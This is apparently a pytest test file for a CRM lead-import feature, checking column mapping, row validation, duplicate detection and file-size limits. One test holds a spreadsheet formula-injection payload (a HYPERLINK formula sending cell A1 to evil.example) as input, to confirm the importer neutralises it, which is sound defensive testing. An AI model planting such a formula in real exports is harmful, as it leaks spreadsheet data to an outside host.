"""Import policy. One click can create thousands of records, so the rules are strict."""

from __future__ import annotations

from typing import Any

import pytest

from domain.leads.importing import (
    MAX_ROWS,
    plan_import,
    suggest_mapping,
    validate_mapping,
)
from shared.exceptions import ValidationError

MAPPING = {"Email": "email", "First Name": "first_name"}


def row(**over: Any) -> dict[str, Any]:
    base = {"First Name": "Asha", "Email": "asha@example.in"}
    base.update(over)
    return base


class TestHeaderMapping:
    def test_common_export_spellings_are_recognised(self) -> None:
        mapping = suggest_mapping(["First Name", "E-Mail", "Mobile Number", "Organisation"])
        assert mapping["First Name"] == "first_name"
        assert mapping["E-Mail"] == "email"
        assert mapping["Mobile Number"] == "phone"
        assert mapping["Organisation"] == "company"

    def test_an_unrecognised_header_maps_to_nothing_rather_than_guessing(self) -> None:
        assert suggest_mapping(["Lead Temperature"])["Lead Temperature"] is None

    def test_two_headers_never_claim_the_same_field(self) -> None:
        mapping = suggest_mapping(["Email", "Email Address"])
        assert [v for v in mapping.values() if v == "email"] == ["email"]

    def test_a_mapping_without_a_contact_column_is_refused(self) -> None:
        with pytest.raises(ValidationError):
            validate_mapping({"First Name": "first_name"})

    def test_a_mapping_without_a_name_is_refused(self) -> None:
        with pytest.raises(ValidationError):
            validate_mapping({"Email": "email"})

    def test_a_field_an_import_may_not_set_is_refused(self) -> None:
        """Status and score are earned, not imported."""
        with pytest.raises(ValidationError):
            validate_mapping({**MAPPING, "Score": "qualification_score"})


class TestRowJudgement:
    def test_a_clean_row_is_accepted_and_normalised(self) -> None:
        plan = plan_import([row(Email="ASHA@Example.IN")], MAPPING)
        assert plan.rejected == []
        accepted = plan.accepted[0]
        assert accepted.values["email"] == "asha@example.in"
        assert accepted.row_number == 2, "row 1 is the header in the user's file"

    def test_a_row_with_no_way_to_contact_anyone_is_rejected(self) -> None:
        plan = plan_import([row(Email="")], MAPPING)
        assert plan.accepted == []
        assert "could not be contacted" in plan.rejected[0].reasons[-1]

    def test_a_malformed_email_is_rejected_not_repaired(self) -> None:
        """Guessing produces plausible rubbish nobody notices until a campaign bounces."""
        plan = plan_import([row(Email="asha at example dot in")], MAPPING)
        assert plan.accepted == []

    def test_a_short_phone_is_rejected(self) -> None:
        mapping = {"First Name": "first_name", "Phone": "phone"}
        plan = plan_import([{"First Name": "Asha", "Phone": "1234"}], mapping)
        assert plan.accepted == []

    def test_a_row_with_neither_a_person_nor_a_business_is_rejected(self) -> None:
        plan = plan_import([row(**{"First Name": ""})], MAPPING)
        assert plan.accepted == []
        assert "no contact person and no business name" in plan.rejected[0].reasons

    def test_a_business_with_no_named_contact_is_accepted(self) -> None:
        """The normal state of a prospecting list: a shop and a phone number.

        Requiring a named human would make the common case unimportable, so the
        business name becomes the record's name and the substitution is recorded
        rather than left for somebody to infer.
        """
        mapping = {"Business": "company", "Phone": "phone"}
        plan = plan_import(
            [{"Business": "Sri Lakshmi Sweets", "Phone": "9845011223"}],
            mapping,
        )
        assert len(plan.accepted) == 1
        accepted = plan.accepted[0]
        assert accepted.values["first_name"] == "Sri Lakshmi Sweets"
        assert accepted.capture["company"] == "Sri Lakshmi Sweets"
        assert accepted.capture["name_is_business"] is True

    def test_a_formula_cell_cannot_survive_into_a_later_export(self) -> None:
        """A vendor list carrying `=HYPERLINK(...)` must not stay executable."""
        mapping = {"First Name": "first_name", "Email": "email", "Notes": "notes"}
        plan = plan_import(
            [
                {
                    "First Name": "Asha",
                    "Email": "asha@example.in",
                    "Notes": '=HYPERLINK("http://evil.example/?"&A1,"click")',
                }
            ],
            mapping,
        )
        assert plan.accepted[0].capture["notes"].startswith("'=")

    def test_duplicates_inside_the_same_file_are_caught(self) -> None:
        """The commonest way a CRM gets twins on day one."""
        plan = plan_import([row(), row()], MAPPING)
        assert len(plan.accepted) == 1
        assert "duplicate of row 2" in plan.rejected[0].reasons[0]

    def test_unmapped_columns_are_preserved_as_capture_rather_than_dropped(self) -> None:
        plan = plan_import([row(**{"Lead Temperature": "warm"})], MAPPING)
        assert plan.accepted[0].capture["extra"]["Lead Temperature"] == "warm"

    def test_mapped_context_columns_land_in_capture_not_on_the_lead(self) -> None:
        mapping = {**MAPPING, "Company": "company"}
        plan = plan_import([row(Company="Sharma Textiles")], mapping)
        assert plan.accepted[0].capture["company"] == "Sharma Textiles"
        assert "company" not in plan.accepted[0].values


class TestWholeFileRules:
    def test_an_empty_file_is_refused(self) -> None:
        with pytest.raises(ValidationError):
            plan_import([], MAPPING)

    def test_an_oversized_file_is_refused(self) -> None:
        with pytest.raises(ValidationError):
            plan_import([row(Email=f"a{i}@example.in") for i in range(MAX_ROWS + 1)], MAPPING)

    def test_the_plan_reports_both_sides_so_a_run_can_be_previewed(self) -> None:
        plan = plan_import([row(), row(Email="bad"), row(Email="b@example.in")], MAPPING)
        summary = plan.summary()
        assert summary["total_rows"] == 3
        assert summary["accepted"] == 2
        assert summary["rejected"] == 1
        assert summary["rejections"][0]["row"] == 3
